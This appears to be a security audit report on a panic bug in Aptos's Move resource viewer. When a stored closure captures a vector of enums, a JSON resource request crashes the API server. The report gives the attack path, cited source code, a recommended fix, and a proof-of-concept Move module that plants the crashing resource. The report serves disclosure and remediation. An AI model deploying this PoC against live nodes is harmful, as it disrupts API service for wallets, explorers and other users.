# Audit Report

## Title
Panic in Move Resource Viewer When Processing Closures Capturing Enum Vectors Causes API Server Crashes

## Summary
A panic vulnerability exists in the Move resource viewer library when the API server processes resources containing closures that capture `vector<Enum>` values. The `.unwrap()` call triggers when handling `FatType::RuntimeVariants` element types, causing API server crashes when clients request JSON-formatted resource data.

## Finding Description

The vulnerability stems from improper error handling when converting `FatType::RuntimeVariants` to `TypeTag`. The panic occurs at line 911 in the vector annotation logic: [1](#0-0) 

The `type_tag()` method explicitly returns an error for `RuntimeVariants` types (used for enum types), making the `.unwrap()` call unsafe: [2](#0-1) 

**Complete Attack Path:**

1. **Deployment**: Attacker deploys a Move module with a resource containing a closure field that captures a `vector<MyEnum>` value. Closures can have `store` ability when the underlying function is public or has `#[persistent]` attribute: [3](#0-2) 

2. **Storage**: The resource with the closure is stored on-chain using `move_to`.

3. **API Request**: When a client requests this resource via `GET /accounts/{address}/resource/{resource_type}` with `AcceptType::Json`, the MoveConverter is invoked: [4](#0-3) 

4. **Annotation**: The `view_resource` method initiates the annotation process: [5](#0-4) 

For closure fields, `annotate_closure` is invoked, which calls `FatType::from_runtime_layout` on captured values: [6](#0-5) 

5. **Layout Conversion**: When a closure captures `vector<Enum>`, the runtime layout `MoveStructLayout::RuntimeVariants` is converted to `FatType::RuntimeVariants`: [7](#0-6) 

6. **Panic Trigger**: The `annotate_value` method processes the vector and calls `.unwrap()` on the element type's `type_tag()` at line 911, which panics for `RuntimeVariants`.

**Important Note**: The storage indexer is NOT affected. The `collect_table_info_from_value` method has a catch-all pattern that handles closures and RuntimeVariants as no-ops: [8](#0-7) 

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria as it causes "API crashes". The REST API is a critical production component that:
- Enables transaction submission and state queries
- Services wallets, explorers, and dApps
- Provides the primary interface for network interaction

A crash requires API server restart and can be repeatedly triggered, causing service disruption. The vulnerability only affects JSON response format; BCS format requests bypass the annotation path and are unaffected.

## Likelihood Explanation

**High likelihood**. The attack is trivial to execute:
- Enum types are standard Move features available since bytecode version 7
- Closures with `store` ability can be persisted on-chain when functions are public or marked `#[persistent]`
- Any user can deploy a malicious module with minimal gas cost
- No special permissions or validator access required
- Attack payload is small and reproducible

Concrete example of enum with `store` ability exists in the Aptos framework: [9](#0-8) 

## Recommendation

Replace the `.unwrap()` call at line 911 with proper error handling using the `?` operator or an explicit error message. The fix should handle `RuntimeVariants` gracefully, either by:

1. Returning an appropriate error that gets propagated up the call chain
2. Using a fallback representation for RuntimeVariants in JSON (similar to how RawStruct is used for Runtime types)

Example fix:
```rust
_ => AnnotatedMoveValue::Vector(
    ty.type_tag(limit)?,  // Use ? instead of unwrap()
    a.iter()
        .map(|v| self.annotate_value(v, ty.as_ref(), limit))
        .collect::<anyhow::Result<_>>()?,
),
```

Additionally, consider implementing special handling for closure annotations to prevent this entire code path when closures capture complex types.

## Proof of Concept

```move
module attacker::exploit {
    use std::vector;
    
    // Enum type with store ability
    enum MyEnum has store {
        VariantA { value: u64 },
        VariantB { data: vector<u8> }
    }
    
    // Resource containing closure that captures vector<MyEnum>
    struct MaliciousResource has key {
        closure_field: ||u64 has store
    }
    
    #[persistent]
    fun persistent_function(captured: vector<MyEnum>): u64 {
        vector::length(&captured)
    }
    
    public entry fun deploy_exploit(account: &signer) {
        let enums = vector::empty<MyEnum>();
        vector::push_back(&mut enums, MyEnum::VariantA { value: 42 });
        
        // Create closure capturing vector<MyEnum>
        let closure = || persistent_function(enums);
        
        // Store resource on-chain
        move_to(account, MaliciousResource { closure_field: closure });
    }
}
```

After deploying this module and calling `deploy_exploit`, any API request to `GET /v1/accounts/{address}/resource/0x{address}::exploit::MaliciousResource` with `Accept: application/json` will trigger the panic and crash the API server.

### Citations

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L336-354)
```rust
    pub fn view_resource(
        &self,
        tag: &StructTag,
        blob: &[u8],
    ) -> anyhow::Result<AnnotatedMoveStruct> {
        self.view_resource_with_limit(tag, blob, &mut Limiter::default())
    }

    pub fn view_resource_with_limit(
        &self,
        tag: &StructTag,
        blob: &[u8],
        limit: &mut Limiter,
    ) -> anyhow::Result<AnnotatedMoveStruct> {
        let ty = self.resolve_struct_tag(tag, &mut Limiter::default())?;
        let struct_def = (ty.as_ref()).try_into().map_err(into_vm_status)?;
        let move_struct = MoveStruct::simple_deserialize(blob, &struct_def)?;
        self.annotate_struct(&move_struct, &ty, limit)
    }
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L856-878)
```rust
        let MoveClosure {
            module_id,
            fun_id,
            ty_args,
            mask,
            captured,
        } = move_closure;
        let captured = captured
            .iter()
            .map(|(layout, value)| {
                let fat_type = FatType::from_runtime_layout(layout, limit)
                    .map_err(|e| anyhow!("failed to annotate captured value: {}", e))?;
                self.annotate_value(value, &fat_type, limit)
            })
            .collect::<anyhow::Result<Vec<_>>>()?;
        Ok(AnnotatedMoveClosure {
            module_id: module_id.clone(),
            fun_id: fun_id.clone(),
            ty_args: ty_args.to_vec(),
            mask: *mask,
            captured,
        })
    }
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L910-915)
```rust
                _ => AnnotatedMoveValue::Vector(
                    ty.type_tag(limit).unwrap(),
                    a.iter()
                        .map(|v| self.annotate_value(v, ty.as_ref(), limit))
                        .collect::<anyhow::Result<_>>()?,
                ),
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L1027-1051)
```rust
            (FatType::Bool, _)
            | (FatType::U8, _)
            | (FatType::U16, _)
            | (FatType::U32, _)
            | (FatType::U64, _)
            | (FatType::U128, _)
            | (FatType::U256, _)
            | (FatType::Address, _)
            | (FatType::Signer, _)
            | (FatType::Vector(_), _)
            | (FatType::Struct(_), _)
            | (FatType::Reference(_), _)
            | (FatType::MutableReference(_), _)
            | (FatType::TyParam(_), _)
            | (FatType::Runtime(_), _)
            | (FatType::RuntimeVariants(_), _)
            | (FatType::Function(_), _)
            | (FatType::I8, _)
            | (FatType::I16, _)
            | (FatType::I32, _)
            | (FatType::I64, _)
            | (FatType::I128, _)
            | (FatType::I256, _) => Ok(()),
        }
    }
```

**File:** third_party/move/tools/move-resource-viewer/src/fat_type.rs (L458-463)
```rust
            Reference(_) | MutableReference(_) | TyParam(_) | RuntimeVariants(_) | Runtime(..) => {
                return Err(
                    PartialVMError::new(StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR)
                        .with_message(format!("cannot derive type tag for {:?}", self)),
                )
            },
```

**File:** third_party/move/tools/move-resource-viewer/src/fat_type.rs (L490-498)
```rust
            Vector(ty) => FatType::Vector(Box::new(Self::from_runtime_layout(ty, limit)?)),
            Struct(MoveStructLayout::Runtime(tys)) => {
                FatType::Runtime(Self::from_layout_slice(tys, limit)?)
            },
            Struct(MoveStructLayout::RuntimeVariants(vars)) => FatType::RuntimeVariants(
                vars.iter()
                    .map(|tys| Self::from_layout_slice(tys, limit))
                    .collect::<PartialVMResult<Vec<Vec<_>>>>()?,
            ),
```

**File:** third_party/move/move-bytecode-verifier/src/type_safety.rs (L354-361)
```rust
    let mut abilities = if func_handle
        .attributes
        .contains(&FunctionAttribute::Persistent)
    {
        AbilitySet::PUBLIC_FUNCTIONS
    } else {
        AbilitySet::PRIVATE_FUNCTIONS
    };
```

**File:** api/types/src/convert.rs (L85-95)
```rust
    pub fn try_into_resources<'b>(
        &self,
        data: impl Iterator<Item = (StructTag, &'b [u8])>,
    ) -> Result<Vec<MoveResource>> {
        data.map(|(typ, bytes)| self.inner.view_resource(&typ, bytes)?.try_into())
            .collect()
    }

    pub fn try_into_resource(&self, tag: &StructTag, bytes: &'_ [u8]) -> Result<MoveResource> {
        self.inner.view_resource(tag, bytes)?.try_into()
    }
```

**File:** aptos-move/framework/aptos-stdlib/sources/data_structures/storage_slots_allocator.move (L31-41)
```text
    enum Link<T: store> has store {
        /// Variant that stores actual data
        Occupied {
            value: T,
        },
        /// Empty variant (that keeps storage item from being deleted)
        /// and represents a node in a linked list of empty slots.
        Vacant {
            next: u64,
        }
    }
```
